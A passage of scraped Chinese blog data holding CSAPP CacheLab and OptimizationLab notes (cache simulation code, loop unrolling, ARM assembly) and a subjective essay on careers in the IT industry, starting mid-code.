l3ucache[setIndex3][index].tag == tag3) { ++l3_hits; ++timeStamp; l3ucache[setIndex3][index].latest_used = timeStamp; fetchl3tol2(setIndex2, tag2, DATA); fetchl2tol1d(setIndex1, tag1); for (int i = 0; i \u0026lt; L1_LINE_NUM; ++i) { if (l1dcache[setIndex1][i].valid \u0026amp;\u0026amp; l1dcache[setIndex1][i].tag == tag1) { l1dcache[setIndex1][i].dirty = true; return; } } } } // l3u write miss,在内存中写，然后直接加载上去，是否正确,显然错误 ++l3_misses; fetchMemoryTol3(setIndex3, tag3, DATA); fetchl3tol2(setIndex2, tag2, DATA); fetchl2tol1d(setIndex1, tag1); // 在fetch完了之后，在set1中找要写的值，接着写入即可 for (int i = 0; i \u0026lt; L1_LINE_NUM; ++i) { if (l1dcache[setIndex1][i].valid \u0026amp;\u0026amp; l1dcache[setIndex1][i].tag == tag1) { l1dcache[setIndex1][i].dirty = true; return; } } } // you are not allowed to modify the declaration of this function /*cacheAccess函数接受三个参数，参数的定义为： * 而且我们不考虑byte的个数，我们这个函数只是模拟访问内存的操作，不实际读写数据 *@params op 为访问类型，是一个char类型的参数，具体取值和trace文件中的类型相同，为[I, S, L，M]其中的一个。 *@params addr 为访问地址，它是trace文件中的地址的十进制表示的结果,64位16进制内存地址 *@params len 为一次访问的长度，也就是字节数量 * 思考过程： * 1.怎么处理地址？要根据不同缓存级别的组数用不同的方式来解读地址么？然后剩下的位都是tag标志 * 2.I是指令加载的过程，和数据读取类似，但是一级缓存中只能从L1I中来读取指令数据 * 3.M修改数据，就是一次Load加上一次Store Load：就是读取 Store：就是写入数据 * 4.代码框架大概是怎样的？一个对应的指令实现一个功能？ */ void cacheAccess(char op, uint64_t addr, uint32_t len) { switch (op) { case \u0026#39;I\u0026#39;: instruct(addr); break; case \u0026#39;M\u0026#39;: load(addr); store(addr); break; case \u0026#39;L\u0026#39;: load(addr); break; case \u0026#39;S\u0026#39;: store(addr); break; default: break; } } ","date":"13 April 2025","externalUrl":null,"permalink":"/csapp/csappcachelab/","section":"","summary":"\u003ch1 class=\"relative group\"\u003eCSAPP:CacheLab \n    \u003cdiv id=\"csappcachelab\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#csappcachelab\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e本次lab分为A和B两部分，我先看情况做，并且会部分引用我校助教撰写的一些内容以及思考题，首先我们要熟悉一下Cache的工作原理，关于这一部分的内容，你也可以看我的ComputerOrgnization中的内容（写的不怎么样，你最好还是看课本，而且我还建议你做一下课本上的习题），A部分是实现一个3级Cache，实现的过程中我们应当会对Cache的工作原理更加熟悉，B部分是优化矩阵转置函数，我认为会教会我们什么是Cahce友好的代码。\u003c/p\u003e\n\u003cp\u003e注意：以下不会从零开始讲述Cache的知识，并且\u003cstrong\u003e不要抄袭，不要抄袭，不要抄袭\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003eCache:计算机的世界无处不在的伟大思想\u0026hellip;\u0026hellip;\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e熟悉：\u003c/p\u003e","title":"CSAPP:CacheLab","type":"csapp"},{"content":" CSAPP:OptimizationLab # 本次实验我们来优化一段计算多项式值的代码，并且亲自测量其性能，希望能加深同学们对机器特定优化的理解，同时为同学们提供测量性能的经验。\n基本材料都引用于我校的CSAPP实验指导书页面。\n预习：\n我们先明确几个概念\nCPE # 处理一个数据元素要多少个时钟周期。\n比如上图，有一个函数对于一个数组的每个元素进行一些重复的操作，那么就可以计算每个元素消耗了多少时钟周期，这就是CPE。\n把数组长度n作为自变量，消耗的cycles作为因变量，那么就可以画出一条曲线，曲线的斜率就是CPE。\nLatency bound # 延迟受限\n如下，当存在数据依赖的时候，计算下一次结果时必须等待上一次计算完毕，这个时间没办法减少，就叫latency bound。\n那么CPE的下界就是一次浮点乘法运算的时间。\ndouble product(double a[], long n) { long i; double x = 1.0; for (i = 0; i \u0026lt; n; ++i) { x *= a[i]; } return x; } Throughput bound # 吞吐受限\n没有依赖的问题，单次进行的用时较短，但是用来并发处理的执行单元较少带来的下界。\n循环展开 # 要突破Latency bound到Throughput bound，就要消除数据依赖的问题。\n2*1展开 # 消除了分支预测，但是还有数据依赖。\nfor (i = 0; i \u0026lt; limit; i+=2) { x = (x OP d[i]) OP d[i+1]; } 2*1a展开 # 这样就使得依赖的路径变短。\nfor (i = 0; i \u0026lt; limit; i+=2) { x = x OP (d[i] OP d[i+1]); } 2*2展开 # 这里有两个累积乘积的变量，能让他们在两条流水线上执行。\nfor (i = 0; i \u0026lt; limit; i+=2) { x0 = x0 OP d[i]; x1 = x1 OP d[i+1]; } K*K展开 # 我们可以用这样比较夸张的展开手法，但是当你用的局部变量过多的时候，寄存器就不够用了，内存读写就会成为新的Bound。\ndouble product(double a[], long n) { long i; double acc1 = 1.0; double acc2 = 1.0; double acc3 = 1.0; double acc4 = 1.0; double acc5 = 1.0; double acc6 = 1.0; double acc7 = 1.0; double acc8 = 1.0; double acc9 = 1.0; double acc10 = 1.0; for (i = 0; i + 9 \u0026lt; n; i += 10) { acc1 *= a[i]; acc2 *= a[i + 1]; acc3 *= a[i + 2]; acc4 *= a[i + 3]; acc5 *= a[i + 4]; acc6 *= a[i + 5]; acc7 *= a[i + 6]; acc8 *= a[i + 7]; acc9 *= a[i + 8]; acc10 *= a[i + 9]; } acc1 *= acc2; acc3 *= acc4; acc5 *= acc6; acc7 *= acc8; acc9 *= acc10; acc1 *= acc3; acc5 *= acc7; for (; i \u0026lt; n; ++i) { acc9 *= a[i]; } return acc1 * acc5 * acc9; } PartA:性能测量实验 # void poly(const double a[], double x, long degree, double *result) { long i; double r = a[degree]; for (i = degree - 1; i \u0026gt;= 0; i--) { r = a[i] + r * x; } *result = r; } 这是用秦九韶算法实现了求一个函数在某个点处的值的功能。\n我想测量这个函数的CPE。\n我们能使用的函数有很多，最推荐的是clock_gettime，它可以精确到纳秒级（至少单位是纳秒级），并且可以选取不同的时钟源。\n注意：在测量这个函数用时多少的时候，最好在一开始首先执行一遍你要测量的函数，这样cache中会存放这些调用时要使用的数据，不会引发大量的cachemiss引入不必要的噪声。\n代码很简单：\nvoid measure_time(poly_func_t poly, const double a[], double x, long degree, double *time) { double result = 0; poly(a, x, degree, \u0026amp;result); struct timespec start, end; clock_gettime(CLOCK_MONOTONIC, \u0026amp;start); poly(a, x, degree, \u0026amp;result); clock_gettime(CLOCK_MONOTONIC, \u0026amp;end); (*time) = end.tv_nsec - start.tv_nsec; } PartB：代码优化实验 # 针对于上面的这个多项式算法，我们有什么优化的方法，我想大概也就是循环展开之类的，来试试看!\n我们的目的是要把这个函数的CPE降低到1。\n我们根据现有的代码进行了一个更改，对于原函数进行12*12的循环展开。\nvoid poly_optim(const double a[], double x, long degree, double *result) { // 此时和秦九公式已经没有关系了，我们想办法最快算出答案即可。 double acc[12]; double xpow[13]; // 记录系数 acc[0] = a[degree]; acc[1] = a[degree - 1]; acc[2] = a[degree - 2]; acc[3] = a[degree - 3]; acc[4] = a[degree - 4]; acc[5] = a[degree - 5]; acc[6] = a[degree - 6]; acc[7] = a[degree - 7]; acc[8] = a[degree - 8]; acc[9] = a[degree - 9]; acc[10] = a[degree - 10]; acc[11] = a[degree - 11]; // 使用x的哪些幂 xpow[2] = x * x; xpow[3] = xpow[2] * x; xpow[4] = xpow[3] * x; xpow[5] = xpow[4] * x; xpow[6] = xpow[5] * x; xpow[7] = xpow[6] * x; xpow[8] = xpow[7] * x; xpow[9] = xpow[8] * x; xpow[10] = xpow[9] * x; xpow[11] = xpow[10] * x; xpow[12] = xpow[6] * xpow[6]; // 从倒数12个开始向前进行累积 int index = degree - 12; // int index = degree - 10; while (index \u0026gt;= 11) { acc[0] = a[index] + acc[0] * xpow[12]; acc[1] = a[index - 1] + acc[1] * xpow[12]; acc[2] = a[index - 2] + acc[2] * xpow[12]; acc[3] = a[index - 3] + acc[3] * xpow[12]; acc[4] = a[index - 4] + acc[4] * xpow[12]; acc[5] = a[index - 5] + acc[5] * xpow[12]; acc[6] = a[index - 6] + acc[6] * xpow[12]; acc[7] = a[index - 7] + acc[7] * xpow[12]; acc[8] = a[index - 8] + acc[8] * xpow[12]; acc[9] = a[index - 9] + acc[9] * xpow[12]; acc[10] = a[index - 10] + acc[10] * xpow[12]; acc[11] = a[index - 11] + acc[11] * xpow[12]; index -= 12; } // 处理剩下没有计算到的部分 long remain = (degree + 1) % 12; long rest_index = remain; double remainValue = 0; while (rest_index \u0026gt; 0) { remainValue *= x; remainValue += a[rest_index - 1]; --rest_index; } //相当于是一种位移,先把他们之间分开 double remain1 = acc[0] * xpow[11]; double remain2 = acc[1] * xpow[10]; double remain3 = acc[2] * xpow[9]; double remain4 = acc[3] * xpow[8]; double remain5 = acc[4] * xpow[7]; double remain6 = acc[5] * xpow[6]; double remain7 = acc[6] * xpow[5]; double remain8 = acc[7] * xpow[4]; double remain9 = acc[8] * xpow[3]; double remain10 = acc[9] * xpow[2]; double remain11 = acc[10] * x + acc[11]; double mainPart = remain1 + remain2 + remain3 + remain4 + remain5 + remain6 + remain7 + remain8 + remain9 + remain10 + remain11; //接着整体向后移位 index = 0; //----------------------------------------------------------------------------------------------------------- // //\t这里我有一个惨痛的教训： //\t我一开始很长时间把下边循环的限制量写成了rest_index,但是rest_index在上面早就减为0,循环不会再继续 //\t而这里对于答案造成的影响本来就非常非常小，导致我认为是上面的乘法和加法的精度上出了问题，于是浪费了很多时间在更改分块大小观察精度上 //\t直到最后才看到这里出了问题：写的代码再多，有时也会犯这样的错误 //\t1.务必起一个好的变量名，让人知道在干嘛，哪怕是简单的程序 //\t2.想清楚自己在写什么东西，如果是限制量，搞清楚它的大小 // //----------------------------------------------------------------------------------------------------------- while(index \u0026lt; remain){ mainPart *= x; ++index; } (*result) = remainValue + mainPart; } 思考问题： # 为什么这样更改这个函数的CPE就是1？我就是自己随便想一下，你可以把你的见解放在评论区，说实话我也想不清楚\u0026hellip;\u0026hellip;\n1.如果使用 poly() 同时计算多项式在两个x处的值，运行时间如何？14个值呢？需要计算 14 个值时，使用一次 poly() 同时计算快，还是调用14次 poly_optim() 快？\nvoid poly(const double a[], double x[], long degree, double result[], int n) { long i; double r[n]; memset(r, a[degree]); for (i = degree - 1; i \u0026gt;= 0; i--) { r[0] = a[i] + r[0] * x; r[1] = a[i] + r[1] * x; } for (int index = 0; index \u0026lt; n; ++index){ result[index] = r[index]; } } Q：可能是把参数作为一个数组传入poly()进行计算，在poly中传入一个x数组，还是只有一个循环的情况下，我们进行计算（大概就是上面这个意思），同时计算两个的时候，应该比调用两次poly计算更快，但没有解决依赖的问题。我觉得在degree比较高的时候，是否还是调用14次函数更快。\n2.为什么优化后的函数 CPE 是 1 而不是 0.5，性能瓶颈在哪里?\nQ：1.o对于这个函数来说是否已经是理论峰值？\n以下是优化生成的汇编代码：\n.arch armv8-a .file\t\u0026#34;poly.c\u0026#34; .text .align\t2 .global\tpoly_optim .type\tpoly_optim, %function poly_optim: .LFB0: .cfi_startproc stp\td8, d9, [sp, -64]! .cfi_def_cfa_offset 64 .cfi_offset 72, -64 .cfi_offset 73, -56 stp\td10, d11, [sp, 16] stp\td12, d13, [sp, 32] str\td14, [sp, 48] .cfi_offset 74, -48 .cfi_offset 75, -40 .cfi_offset 76, -32 .cfi_offset 77, -24 .cfi_offset 78, -16 mov\tx5, x0 ldr\td24, [x0, x1, lsl 3] add\tx0, x0, x1, lsl 3 ldr\td23, [x0, -8] ldr\td22, [x0, -16] ldr\td21, [x0, -24] ldr\td20, [x0, -32] ldr\td19, [x0, -40] ldr\td18, [x0, -48] ldr\td17, [x0, -56] ldr\td16, [x0, -64] ldr\td7, [x0, -72] ldr\td6, [x0, -80] ldr\td5, [x0, -88] ldr\td4, [x0, -96] ldr\td3, [x0, -104] ldr\td26, [x0, -112] fmul\td27, d0, d0 fmul\td28, d27, d0 fmul\td29, d28, d0 fmul\td30, d29, d0 fmul\td31, d30, d0 fmul\td8, d31, d0 fmul\td9, d8, d0 fmul\td10, d9, d0 fmul\td11, d10, d0 fmul\td12, d11, d0 fmul\td13, d12, d0 fmul\td14, d13, d0 fmul\td2, d14, d0 fmul\td1, d2, d0 sub\tw4, w1, #15 cmp\tw4, 13 ble\t.L2 add\tx3, x5, w4, sxtw 3 .L3: fmul\td24, d1, d24 ldr\td25, [x3] fadd\td24, d24, d25 fmul\td23, d1, d23 ldr\td25, [x3, -8] fadd\td23, d23, d25 fmul\td22, d1, d22 ldr\td25, [x3, -16] fadd\td22, d22, d25 fmul\td21, d1, d21 ldr\td25, [x3, -24] fadd\td21, d21, d25 fmul\td20, d1, d20 ldr\td25, [x3, -32] fadd\td20, d20, d25 fmul\td19, d1, d19 ldr\td25, [x3, -40] fadd\td19, d19, d25 fmul\td18, d1, d18 ldr\td25, [x3, -48] fadd\td18, d18, d25 fmul\td17, d1, d17 ldr\td25, [x3, -56] fadd\td17, d17, d25 fmul\td16, d1, d16 ldr\td25, [x3, -64] fadd\td16, d16, d25 fmul\td7, d1, d7 ldr\td25, [x3, -72] fadd\td7, d7, d25 fmul\td6, d1, d6 ldr\td25, [x3, -80] fadd\td6, d6, d25 fmul\td5, d1, d5 ldr\td25, [x3, -88] fadd\td5, d5, d25 fmul\td4, d1, d4 ldr\td25, [x3, -96] fadd\td4, d4, d25 fmul\td3, d1, d3 ldr\td25, [x3, -104] fadd\td3, d3, d25 fmul\td26, d1, d26 ldr\td25, [x3, -112] fadd\td26, d26, d25 sub\tw4, w4, #15 sub\tx3, x3, #120 cmp\tw4, 13 bgt\t.L3 .L2: add\tx3, x1, 1 mov\tx1, -8608480567731124088 movk\tx1, 0x8889, lsl 0 smulh\tx1, x3, x1 add\tx1, x1, x3 asr\tx1, x1, 3 sub\tx0, x1, x3, asr 63 lsl\tx1, x0, 4 sub\tx0, x1, x0 sub\tx0, x3, x0 cmp\tx0, 0 ble\t.L8 mov\tx1, x0 movi\td25, #0 sub\tx3, x5, #8 .L5: fmul\td25, d0, d25 ldr\td1, [x3, x1, lsl 3] fadd\td25, d25, d1 subs\tx1, x1, #1 bne\t.L5 .L4: fmul\td1, d2, d24 fmul\td14, d14, d23 fadd\td1, d1, d14 fmul\td13, d13, d22 fadd\td1, d1, d13 fmul\td12, d12, d21 fadd\td1, d1, d12 fmul\td11, d11, d20 fadd\td1, d1, d11 fmul\td10, d10, d19 fadd\td1, d1, d10 fmul\td9, d9, d18 fadd\td1, d1, d9 fmul\td8, d8, d17 fadd\td1, d1, d8 fmul\td31, d31, d16 fadd\td1, d1, d31 fmul\td30, d30, d7 fadd\td1, d1, d30 fmul\td29, d29, d6 fadd\td1, d1, d29 fmul\td28, d28, d5 fadd\td1, d1, d28 fmul\td27, d27, d4 fadd\td1, d1, d27 fmul\td3, d0, d3 fadd\td3, d3, d26 fadd\td1, d1, d3 cmp\tx0, 0 ble\t.L6 mov\tw1, 0 .L7: fmul\td1, d1, d0 add\tw1, w1, 1 cmp\tw1, w0 bne\t.L7 .L6: fadd\td25, d25, d1 str\td25, [x2] ldp\td10, d11, [sp, 16] ldp\td12, d13, [sp, 32] ldr\td14, [sp, 48] ldp\td8, d9, [sp], 64 .cfi_remember_state .cfi_restore 73 .cfi_restore 72 .cfi_restore 78 .cfi_restore 76 .cfi_restore 77 .cfi_restore 74 .cfi_restore 75 .cfi_def_cfa_offset 0 ret .L8: .cfi_restore_state movi\td25, #0 b\t.L4 .cfi_endproc .LFE0: .size\tpoly_optim, .-poly_optim .align\t2 .global\tmeasure_time .type\tmeasure_time, %function 全部都是寄存器操作已经避免了内存读写的开销，我们也没有更多的乘法处理单元？\n问题：SIMD化是什么？\n","date":"10 April 2025","externalUrl":null,"permalink":"/csapp/csappoptimizationlab/","section":"","summary":"\u003ch1 class=\"relative group\"\u003eCSAPP:OptimizationLab \n    \u003cdiv id=\"csappoptimizationlab\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#csappoptimizationlab\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e本次实验我们来优化一段计算多项式值的代码，并且亲自测量其性能，希望能加深同学们对机器特定优化的理解，同时为同学们提供测量性能的经验。\u003c/p\u003e\n\u003cp\u003e基本材料都引用于我校的CSAPP实验指导书页面。\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e预习：\u003c/p\u003e\n\u003cp\u003e我们先明确几个概念\u003c/p\u003e","title":"CSAPP:OptimizationLab","type":"csapp"},{"content":" 本期封面是《響け！ユーフォニアム》配角之一，中川夏纪，声音真的很好听，听说这个动漫到《利兹与青鸟》就完结了来着（？）\n关于IT行业的看法（IT另解笔记） # 1.学历在CS的行业不会成为任何优势（但是它重要），过硬的技术和能力才是，记清楚这一点，才不会盲目。请勿再将未来的希望寄托在你所在的学校身上了，你的一切，你的兴趣，都要自己费力去追寻\u0026hellip;\u0026hellip;\n2.Caution!本篇博文是强烈带有主观意见的意识流笔记，部分观点可能跟不上时代（2021年），并且不代表笔者的全部观点，但是希望能对于在校的尚对于目标不明确的学生带来一些帮助，视频来源（https://space.bilibili.com/19658621），顺带推荐一下他的C语言视频，如果你还没有学过，或者已经工作但是有进一步理解的需要，学习一下这个视频，会颠覆你对于POP编程的认知。\n3.随着我个人的阅历和经验的增长，我会不断更新这个文章的内容，直到它能够替代我对于这个行业的全部看法而不是简单的视频笔记，我个人的看法就是纯主观的，一个人或者一个组织都不可能给出所谓的“纯粹理性客观”这样的观点，如果真的是这样，那么很多历史怎么会被改写？总之，希望能帮助到你一点的同时也能满足我的分享欲。\n要明确的几个点 # 专业不是职业。\n比赛有什么用？没用\n企业合作类比赛 （目的是为了赚钱）\n对自己有没有提升 占不占时间\n不耽误时间 顺带拿奖可以去\n关键是通用技术的掌握 进实验室？为优秀的学生提供好的资源\n自行斟酌！！！ACM大赛（高中没学过的话，感觉大学很难融入，人家一开始就形成小圈子，要么就是你一开始就真的很感兴趣，然后花大量的时间去学习相关内容，也可以，主动一点才会有故事。）\n教育的目的不是诺奖，体育的目的不是金牌。\n切莫相信个人的经验判断：\n没有人可以被模仿 人只能塑造自己的人生\n人只能关注自己的人生。\n如果绩点都变成了一种值得骄傲与吹嘘的东西，那么，你的大学都学到了什么，你和备战高考的高中生又有什么区别，搞清楚这一点，学到东西，理解到东西，别你绩点高的人，在对于知识的理解上，可能还远远不如你。（这是真的）\n少听故事 多听现实和分析问题的方法 少关注别人的经历\n没有人能够准确地预测未来。\n对于后端程序员来说，计算机网络以及操作系统的理论是否重要。（应对面试）\n操作系统理论：尽可能去理解，值得深度学习。（深度了解操作系统）\n（数据结构本后的本质）\n教材只具有参考的意义，只有辅助的作用。看论文，有突破性的操作系统，前沿，作为后端的底盘。\n大二大三，实习？ # 校园招聘，针对于实习生（Microsoft，Google）申请实习，尽可能走校招（因为我没有什么经验） 社会招聘：有经验的人。 项目是很难的，产品，设计师，用户，开发流程，团队协作精神。。。项目有多少人在用？迭代版本？（工作当中的实际问题，开发的过程，称之为项目和经验，进入企业，才算社会的经验。）\n校园招聘： 良好的通用技术基础。\n\u0026amp;实习生入职一般会被分配什么样的工作。（技术底层越强，任务越核心）\n大厂 中小厂（有可能直接安排到核心职位，有可能没有考核）\nPS: 普通编程任务 小模块 （协作开发）目的：了解公司的开发流程\n培养实际项目经验 技术支持类（协助测试）\nIT类出国学习 # 要不要留学？经济基础 美国太贵 日本 新加坡 英国1.5年（50W）\n不错的经历 留在外面，能不能拿到国家的绿卡？是否会被迫回国。\n奖学金 保研 值不值得？ # 能拿就拿，拿不了拉倒。 （目标是为了获得知识）\n保研 概率问题 不要盲目追求 真正需要研究生的人不需要保研，为什么保研？\n没有清楚自己的人生目的，我不知道研究生有什么用，先保研吧？？？\n自己不知道自己在干什么，嫉妒心，想尽办法争取保研的名额。争取攀登更高山峰的人，反而更能留下保研的可能，有目标的人，不会拘泥于此。\nIT行业的学历重不重要 # 学历很重要，能力很强，不需要学历（另说）\n有着学历的下限就可以（本科）技术上限\n工作好，是因为进的企业好，不是因为学历高。在什么公司担任什么样的工作，薪资和工作不是由学历决定的，是由公司决定的。\nIT技术的发展迭代问题 # 进化论，自然选择学说，没有什么东西是绝对稳定的，没有绝对稳定的工作。\n按键机——》触屏手机 国产手机 全部 系统基于Android系统\n（包括鸿蒙（Harmony OS）系统，基于Android系统，因其开源）\n渐变式的进化 对于技术来说是一样的 Microsoft Typescript基于Javascript\n所以要学习通用技术。（java py go c?）都是工具而已，类似物种间的竞争。\n都是面向对象的思想\n（误区：最多的东西不一定是趋势，很少人能够预料到趋势，流行不是趋势。）\nInter IMD Microsoft和Mac OS 滚轮不相同，形成差异化。C#\n物种的分化，苹果电脑-苹果-Mac touch-。。。\n所有的物种都会灭绝和衰落，不存在绝对稳定的工作与技术 机组原理 数据结构等等都短时间内难再有突破\n谈一谈Python # 语言不能让你就业。\n不要想着一门语言就能找到工作。\n什么样的人去学：非计算机专业，会计\u0026hellip;\u0026hellip;\n人工智能是一个学科，其中的诸多框架是由C++实现的，python也只是写了一些脚本。CS学的东西相当多，语言只是一个工具，语言不是学科。大数据中最多的是java，人智最多是C++，数据分析JS，大脑是不限制语言的，语言也不能和职业扯上关系，主JAVA后端，主GOLANG后端，和职位有关，语言不能决定任何事情，不要纠结语言，不要纠结框架，库，算法底层，数据结构，架构，解决方案，软件构件，编程的艺术！！！（从低到高的一种程序员的排序）\n炒的很火，广告，培训机构，少儿编程。。。（钻石的价格为什么贵）\n解析性语言，2021年，python不好找工作对于开发人员来说，Python web，性能远远低于上述的语言，尤其不适合并发的项目，不是最优选择，容易出现性能问题，需要的岗位有但不多，认识清楚这样一点。\n如何跟进技术迭代 # 关注技术趋势的发展（元宇宙？）\n人工智能未来几年要解决的问题，前端（微前端）关注全球的会议\n国外的期刊之类，重要技术的迭代，培训，投资学习\n与行内业界认识专家合作，了解不同见解？云计算（尚早）\n利用开源社区 GitHub。。。使用的技术尽可能符合趋势发展\n（足够好的英文） 雅思6.0\n考试和实际应用的差异，研究考试。\n技术的目标：更快，更容易使用，更便宜。\n硬件的目标：更加小巧，便于使用。\n人工智能是否能够取代人类的工作 # 基本是完全是可能的，取代是趋势，包括程序员的工作。\n尽可能去追求艺术性的生活，在人工智能取代人类工作的时代，（人应该去享受幸福的生活与创作？） 目前人工智能处于停滞的状态，目前没有替代的能力，没有同理心判决的能力。\u0026mdash;李开复\n艺术的创作，基于个人主义（AI作画） 人类的发展基于人类的个性，人工智能不具备个人意识的能力（目前的情况）。\n人类社会的本质是为了文明的延续，不报乐观或者悲观的心态，基于客观的事实。（科学是将目光真切的看向每一个人）\n计算机系考研问题 # 人不可能攀登他不知道的高峰，还是明确的目的。很多人考研，保研是没有目的的行为，先考个研究生吧，不知道未来想干什么。\n大学生要有自我思考的能力，不能一味的跟风，寻找自己的目标，打开窗子看一看。多自己分析现实情况，问的人应当是自己理想的职位，请教正确的人，才可能获取正确的指导。（你应该干什么，你去干什么？？？老师学长学姐？？？）\n这个世界上没有学习能力的人都去当老师了。\n根据职业来决定，中国开设人智的大学就几个，该领域还是相当差。\n实事求是，不如别的国家。\n现在我们国家有了DeepSeek，但是我还是请大家仔细思考，这和你在大学对于道路的选择有什么关系？\n非群体判断标准 # 上了研就一定会走另一条道路吗?是否考研，成为什么样的人，都取决于自身的情况，而不应当考虑一个集体，我们都只是一个个体，我们不应当成为这样的集体中的一份子，不会因为选择什么，就会成为什么，我们应当基于个体的逻辑分析，我们有没有达到自己想要的岗位的学历的下限，从而去上研，应当学会抉择，而不是盲目的从大流。\n大学社团\n有没有参加的必要，参加了，应当以怎样的眼光看待？交流交往。谈个恋爱？？\n辩论社，音乐，美国化学学会。用处不是很大，主要取决于大学。毫无意义的学分增值，那便没有什么意义。太耗费时间，严重影响学业的话，显然。什么都做，最后可能啥也不是。。。具有很强的竞争气氛，缺乏包容心。。。\n根据自身的情况合理判断吧。\n当学校的培养方案与自己的目标冲突时\n不要漫无目的的卷，那就自己学，没有人歧视你是不是这个专业，没人管你，专业和职业是两个东西，没人在乎你以前是什么专业，只会管你有没有良好的工作能力。\n只有我们自己在乎自己过去不堪入目的往事，没人会记得。 有很多转职业专业者。\n外企 英语 面试题 刷题 # 要看具体的职位，外企待遇也不一定好，根据你想不想去。\n英语，具体情况具体分析，最低雅思6.0，作为最基础的英语水平，尽力去达到。\n忙冲算法？成为算法工程师，技术没有上限，天天刷题，不会进大厂(储蓄不能让人富裕)，最为愚蠢的行为，刷题只能证明你会刷题，不代表你会干活！\n(解释一下什么是操作系统？什么是多道任务？什么是资源管理？你是如何理解设备管理的？解释什么是进程，什么是线程，二者有何区别？进程和线程的实际应用？如何理解存储管理，内存管理，文件系统？解释什么是进程同步？什么是通信？如何理解信号量，消息队列，共享列成？什么叫调度策略？FCFS？STN？什么叫时间片轮转？PR？)？？？？？？？？？？？？？？？？？？？？显然，刷题无法解决这类问题？\n（进程是计算机当中程序的一次执行过程，拥有独立的内存空间，系统资源，线程是进程当中的一个执行单元，共享进程的系统空间和内存资源。应用：多任务处理，并发进程。）\n（内存管理:确保系统有足够的内存可运行程序，避免内存浪费。）\n（文件系统：存储数据的逻辑结构，负责文件的管理存储，负责文件的读写和修改。）\n(进程通信：进程之间传递信息的过程。同步。解决并发问题重要手段。)\n回答问题要有所准备，自己不理解的不要说。不要相信刷题就能进大厂，理解基础知识，有诸多开放性的话题，企业文化。\nAI专业与ACM # 根据自己的情况参加 ACM大赛组 校园招聘是一个加分项，但是并不重要，先要满足必要的要求。（找工作的角度）\n提升阅历的方式，是否愿意牺牲时间去参加这样的学习，自己的学习能力怎么样？鱼和熊掌不可兼得。。。时间有限，不可能什么事情的做好。重在参与是胡说八道，关键是自己要不要参与。空余的时间拿来干什么，自己能不能赢，如果没有赢的机会，那为什么要浪费时间参加。确定目标不要疏忽学业，保研？提升机会，选概率大的东西。区分清楚是锦上添花还是本末倒置。\n蓝桥杯：（报名费400元）有国家工信部撑腰，投了很多钱，背景很硬，参加的人越多的比赛越水，什么人都有。。。视自身情况而定，赚钱还是在搞教育。不要毕业了什么都不会，只会比赛，找实习没人看你拿了什么杯，我们中国人搞了这么多年比赛，获得了什么，只是许多证书，没有什么瞩目的成就，好的公司。搞教育的人都消失了，大家都去捞钱了，你获奖了，老师是分红利的，（一般的大学校，是分赃分利的地方），大部分大学老师，整天浑浑噩噩，等着捞国家红利，让学生们相信什么什么有用，优秀的老师不会整天让你干这干那，你应当干你自己喜欢的事情，追求自己的理想，人应当有认知真理，发现真相的能力，如果你真的喜欢ACM，那你就去干（前提是基础课学的不错哦），不要鸡汤喝得太多，鸡血打的太猛，\nChatGPT主题 # 人类总是害怕那些他们不能理解的事物。——辛德拉\n语言训练模型。小说科幻电影，都以艺术形式呈现，其目的是为了表达人的思想，并非事实。基于事实依据来分析，具体的逻辑。历史和神话的差距，科幻不等于事实。没有什么东西能够轻易的取代一个人，这种工具用于提升人的效率。人工智能只能让人更加有效率的完成任务，没有办法取代人的核心。咖啡师，采矿业等等普通的职业面临的危险，取代，取代的是人的行为，并非人本身。创作很大程度上还是要依赖人类，创作不是模仿，而是去创造新的东西，没有自我意识，训练模型的观点都来自于人类，并无创作的意识。\n计算机细分领域以及生态整合 # 软件开发，设计，编程，维护，测试，架构。 网络，建设维护，操作系统 数据库，设计开发维护三大类 人工智能，机器学习（探索阶段）-数据库-软件工程-语言训练模型（GPT） 嵌入式，嵌入系统，汽车，家电 网络安全，免受未经授权的访问 虚拟现实VR 信息安全 软件测试，售后 数据分析，大量数据提取有用的信息，支持决策，未来趋势-数据库 云计算虚拟化，允许将计算和存储资源从物理基础设施中抽象出来 学科交叉发展，很凌乱的，劳动分工，动态的社会，都在发挥各自的价值\n出国，自己去判断\n认知 决心 对自己的发展好不好？上述二者要达到平衡，金钱也只是其次的。。。\n程序员外包是什么以及为什么大多数人不推荐外包 # 软件开发交给外部的公司，接活干的公司，外包公司，这样的公司很累，员工很难受。节省成本，具有灵活性。-沟通协调的问题-打架，控制与质量问题，技术，进度，创意，不受控制。知识产权的丢失，有潜在的问题，也有合理之处。\n大学生要不要做兼职和搞外快\n家庭是否困难，根据条件来看，绝大部分人没有这样的需求，不要效仿别人赚钱，竞争力市场，根据需求，不能影响我们的主线任务的进展。\n职业的可转变性与避坑\n过了几年，岗位就没有了，失业了。\n小众的职位，假设一门技术X，也有可能是一门语言，存在一种可能，赌对了，有可能获得利润，有自己的前途，赌错了，即刻失业，Node.js近年来便引领了趋势。可能会带来致命的伤害，尽量去选通用的职位，大众的职位，有没有赌本？？？\n专用性程度 完全专用性 专用性程度：java golang 数据结构与算法 Linux 都有其专用性，其本身是具有多样性的。用于诸多的职位上。当有东西落寞的时候，你可以随时转型。\n完全：ios系统 